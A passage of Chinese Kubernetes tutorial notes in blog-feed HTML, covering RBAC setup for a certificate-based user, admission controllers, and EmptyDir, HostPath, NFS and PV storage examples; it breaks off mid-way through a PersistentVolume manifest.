签名申请，申请的用户是devman,组是devgroup</span></span><br><span class="line">[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj &quot;/CN=devman/O=devgroup&quot;     </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2-2) 签署证书</span></span><br><span class="line">[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out devman.crt -days 3650</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3) 设置集群、用户、上下文信息</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换账户到devman</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes</span><br><span class="line">Switched to context &quot;devman@kubernetes&quot;.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看dev下pod，发现没有权限</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl get pods -n dev</span><br><span class="line">Error from server (Forbidden): pods is forbidden: User &quot;devman&quot; cannot list resource &quot;pods&quot; in API group &quot;&quot; in the namespace &quot;dev&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到admin账户</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes</span><br><span class="line">Switched to context &quot;kubernetes-admin@kubernetes&quot;.</span><br></pre></td></tr></table></figure><p>2） 创建Role和RoleBinding，为devman用户授权</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dev-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br><span class="line">  </span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-role-binding</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">devman</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dev-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 pki]# kubectl create -f dev-role.yaml</span><br><span class="line">role.rbac.authorization.k8s.io/dev-role created</span><br><span class="line">rolebinding.rbac.authorization.k8s.io/authorization-role-binding created</span><br></pre></td></tr></table></figure><ol start="3"><li>切换账户，再次验证</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换账户到devman</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes</span><br><span class="line">Switched to context &quot;devman@kubernetes&quot;.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl get pods -n dev</span><br><span class="line">NAME                                 READY   STATUS             RESTARTS   AGE</span><br><span class="line">nginx-deployment-66cb59b984-8wp2k    1/1     Running            0          4d1h</span><br><span class="line">nginx-deployment-66cb59b984-dc46j    1/1     Running            0          4d1h</span><br><span class="line">nginx-deployment-66cb59b984-thfck    1/1     Running            0          4d1h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为了不影响后面的学习,切回admin账户</span></span><br><span class="line">[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes</span><br><span class="line">Switched to context &quot;kubernetes-admin@kubernetes&quot;.</span><br></pre></td></tr></table></figure><h2 id="9-4-准入控制"><a href="#9-4-准入控制" class="headerlink" title="9.4 准入控制"></a>9.4 准入控制</h2><p>通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver才会处理这个请求。</p><p>准入控制是一个可配置的控制器列表，可以通过在Api-Server上通过命令行设置选择执行哪些准入控制器：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">--admission-control</span>=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,</span><br><span class="line">                      DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds</span><br></pre></td></tr></table></figure><p>只有当所有的准入控制器都检查通过之后，apiserver才执行该请求，否则返回拒绝。</p><p>当前可配置的Admission Control准入控制如下：</p><ul><li>AlwaysAdmit：允许所有请求</li><li>AlwaysDeny：禁止所有请求，一般用于测试</li><li>AlwaysPullImages：在启动容器之前总去下载镜像</li><li>DenyExecOnPrivileged：它会拦截所有想在Privileged Container上执行命令的请求</li><li>ImagePolicyWebhook：这个插件将允许后端的一个Webhook程序来完成admission controller的功能。</li><li>Service Account：实现ServiceAccount实现了自动化</li><li>SecurityContextDeny：这个插件将使用SecurityContext的Pod中的定义全部失效</li><li>ResourceQuota：用于资源配额管理目的，观察所有请求，确保在namespace上的配额不会超标</li><li>LimitRanger：用于资源限制管理，作用于namespace上，确保对Pod进行资源限制</li><li>InitialResources：为未设置资源请求与限制的Pod，根据其镜像的历史资源的使用情况进行设置</li><li>NamespaceLifecycle：如果尝试在一个不存在的namespace中创建资源对象，则该创建请求将被拒绝。当删除一个namespace时，系统将会删除该namespace中所有对象。</li><li>DefaultStorageClass：为了实现共享存储的动态供应，为未指定StorageClass或PV的PVC尝试匹配默认的StorageClass，尽可能减少用户在申请PVC时所需了解的后端存储细节</li><li>DefaultTolerationSeconds：这个插件为那些没有设置forgiveness tolerations并具有notready:NoExecute和unreachable:NoExecute两种taints的Pod设置默认的“容忍”时间，为5min</li><li>PodSecurityPolicy：这个插件用于在创建或修改Pod时决定是否根据Pod的security context和可用的PodSecurityPolicy对Pod的安全策略进行控制</li></ul>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 8</title>
      <link href="/2022/07/15/89b8e8027d80-q1jun/"/>
      <url>/2022/07/15/89b8e8027d80-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="8-数据存储"><a href="#8-数据存储" class="headerlink" title="8. 数据存储"></a>8. 数据存储</h1><p>在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes引入了Volume的概念。</p><p>Volume是Pod中能够被多个容器访问的共享目录，它被定义在Pod上，然后被一个Pod里的多个容器挂载到具体的文件目录下，kubernetes通过Volume实现同一个Pod中不同容器之间的数据共享以及数据的持久化存储。Volume的生命容器不与Pod中单个容器的生命周期相关，当容器终止或者重启时，Volume中的数据也不会丢失。</p><p>kubernetes的Volume支持多种类型，比较常见的有下面几个：</p><ul><li>简单存储：EmptyDir、HostPath、NFS</li><li>高级存储：PV、PVC</li><li>配置存储：ConfigMap、Secret</li></ul><h2 id="8-1-基本存储"><a href="#8-1-基本存储" class="headerlink" title="8.1 基本存储"></a>8.1 基本存储</h2><h3 id="8-1-1-EmptyDir"><a href="#8-1-1-EmptyDir" class="headerlink" title="8.1.1 EmptyDir"></a>8.1.1 EmptyDir</h3><p>EmptyDir是最基础的Volume类型，一个EmptyDir就是Host上的一个空目录。</p><p>EmptyDir是在Pod被分配到Node时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为kubernetes会自动分配一个目录，当Pod销毁时， EmptyDir中的数据也会被永久删除。 EmptyDir用途如下：</p><ul><li>临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留</li><li>一个容器需要从另一个容器中获取数据的目录（多容器共享目录）</li></ul><p>接下来，通过一个容器之间文件共享的案例来使用一下EmptyDir。</p><p>在一个Pod中准备两个容器nginx和busybox，然后声明一个Volume分别挂在到两个容器的目录中，然后nginx容器负责向Volume中写日志，busybox中通过命令将日志内容读到控制台。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200413174713773.png" alt="img"></p><p>创建一个volume-emptydir.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">volume-emptydir</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">volumeMounts:</span>  <span class="comment"># 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/log/nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;tail -f /logs/access.log&quot;</span>] <span class="comment"># 初始命令，动态读取指定文件中内容</span></span><br><span class="line">    <span class="attr">volumeMounts:</span>  <span class="comment"># 将logs-volume 挂在到busybox容器中，对应的目录为 /logs</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/logs</span></span><br><span class="line">  <span class="attr">volumes:</span> <span class="comment"># 声明volume， name为logs-volume，类型为emptyDir</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">    <span class="attr">emptyDir:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml</span><br><span class="line">pod/volume-emptydir created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide</span><br><span class="line">NAME                  READY   STATUS    RESTARTS   AGE      IP       NODE   ...... </span><br><span class="line">volume-emptydir       2/2     Running   0          97s   10.42.2.9   node1  ......</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过podIp访问nginx</span></span><br><span class="line">[root@k8s-master01 ~]# curl 10.42.2.9</span><br><span class="line">......</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过kubectl logs命令查看指定容器的标准输出</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox</span><br><span class="line">10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><h3 id="8-1-2-HostPath"><a href="#8-1-2-HostPath" class="headerlink" title="8.1.2 HostPath"></a>8.1.2 HostPath</h3><p>上节课提到，EmptyDir中数据不会被持久化，它会随着Pod的结束而销毁，如果想简单的将数据持久化到主机中，可以选择HostPath。</p><p>HostPath就是将Node主机中一个实际目录挂在到Pod中，以供容器使用，这样的设计就可以保证Pod销毁了，但是数据依据可以存在于Node主机上。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200413214031331.png" alt="img"></p><p>创建一个volume-hostpath.yaml：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">volume-hostpath</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/log/nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;tail -f /logs/access.log&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/logs</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span> </span><br><span class="line">      <span class="attr">path:</span> <span class="string">/root/logs</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span>  <span class="comment"># 目录存在就使用，不存在就先创建后使用</span></span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">关于<span class="variable">type</span>的值的一点说明：</span><br><span class="line">    <span class="variable">DirectoryOrCreate</span> 目录存在就使用，不存在就先创建后使用</span><br><span class="line">    <span class="built_in">Directory</span>   目录必须存在</span><br><span class="line">    <span class="variable">FileOrCreate</span>  文件存在就使用，不存在就先创建后使用</span><br><span class="line">    <span class="built_in">File</span> 文件必须存在 </span><br><span class="line">    <span class="built_in">Socket</span>  <span class="variable">unix</span>套接字必须存在</span><br><span class="line">    <span class="variable">CharDevice</span>  字符设备必须存在</span><br><span class="line">    <span class="variable">BlockDevice</span> 块设备必须存在</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml</span><br><span class="line">pod/volume-hostpath created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide</span><br><span class="line">NAME                  READY   STATUS    RESTARTS   AGE   IP             NODE   ......</span><br><span class="line">pod-volume-hostpath   2/2     Running   0          16s   10.42.2.10     node1  ......</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问nginx</span></span><br><span class="line">[root@k8s-master01 ~]# curl 10.42.2.10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来就可以去host的/root/logs目录下查看存储的文件了</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##  注意: 下面的操作需要到Pod所在的节点运行（案例中是node1）</span></span></span><br><span class="line">[root@node1 ~]# ls /root/logs/</span><br><span class="line">access.log  error.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的</span></span><br></pre></td></tr></table></figure><h3 id="8-1-3-NFS"><a href="#8-1-3-NFS" class="headerlink" title="8.1.3 NFS"></a>8.1.3 NFS</h3><p>HostPath可以解决数据持久化的问题，但是一旦Node节点故障了，Pod如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用NFS、CIFS。</p><p>NFS是一个网络文件存储系统，可以搭建一台NFS服务器，然后将Pod中的存储直接连接到NFS系统上，这样的话，无论Pod在节点上怎么转移，只要Node跟NFS的对接没问题，数据就可以成功访问。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200413215133559.png" alt="img"></p><p>1）首先要准备nfs的服务器，这里为了简单，直接是master节点做nfs服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在nfs上安装nfs服务</span></span><br><span class="line">[root@nfs ~]# yum install nfs-utils -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">准备一个共享目录</span></span><br><span class="line">[root@nfs ~]# mkdir /root/data/nfs -pv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机</span></span><br><span class="line">[root@nfs ~]# vim /etc/exports</span><br><span class="line">[root@nfs ~]# more /etc/exports</span><br><span class="line">/root/data/nfs     192.168.5.0/24(rw,no_root_squash)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动nfs服务</span></span><br><span class="line">[root@nfs ~]# systemctl restart nfs</span><br></pre></td></tr></table></figure><p>2）接下来，要在的每个node节点上都安装下nfs，这样的目的是为了node节点可以驱动nfs设备</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在node上安装nfs服务，注意不需要启动</span></span><br><span class="line">[root@k8s-master01 ~]# yum install nfs-utils -y</span><br></pre></td></tr></table></figure><p>3）接下来，就可以编写pod的配置文件了，创建volume-nfs.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">volume-nfs</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/log/nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;tail -f /logs/access.log&quot;</span>] </span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/logs</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs-volume</span></span><br><span class="line">    <span class="attr">nfs:</span></span><br><span class="line">      <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span>  <span class="comment">#nfs服务器地址</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/root/data/nfs</span> <span class="comment">#共享文件路径</span></span><br></pre></td></tr></table></figure><p>4）最后，运行下pod，观察结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml</span><br><span class="line">pod/volume-nfs created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev</span><br><span class="line">NAME                  READY   STATUS    RESTARTS   AGE</span><br><span class="line">volume-nfs        2/2     Running   0          2m9s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看nfs服务器上的共享目录，发现已经有文件了</span></span><br><span class="line">[root@k8s-master01 ~]# ls /root/data/</span><br><span class="line">access.log  error.log</span><br></pre></td></tr></table></figure><h2 id="8-2-高级存储"><a href="#8-2-高级存储" class="headerlink" title="8.2 高级存储"></a>8.2 高级存储</h2><p>前面已经学习了使用NFS提供存储，此时就要求用户会搭建NFS系统，并且会在yaml配置nfs。由于kubernetes支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes引入PV和PVC两种资源对象。</p><p>PV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下PV由kubernetes管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。</p><p>PVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC其实就是用户向kubernetes系统发出的一种资源需求申请。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200514194111567.png" alt="img"></p><p>使用了PV和PVC之后，工作可以得到进一步的细分：</p><ul><li>存储：存储工程师维护</li><li>PV： kubernetes管理员维护</li><li>PVC：kubernetes用户维护</li></ul><h3 id="8-2-1-PV"><a href="#8-2-1-PV" class="headerlink" title="8.2.1 PV"></a>8.2.1 PV</h3><p>PV是存储资源的抽象，下面是资源清单文件:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>  </span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv2</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span> <span class="comment"># 存储类型，与底层真正存储对应</span></span><br><span class="line">  <span class="attr">capacity:</span>  <span class="comment"># 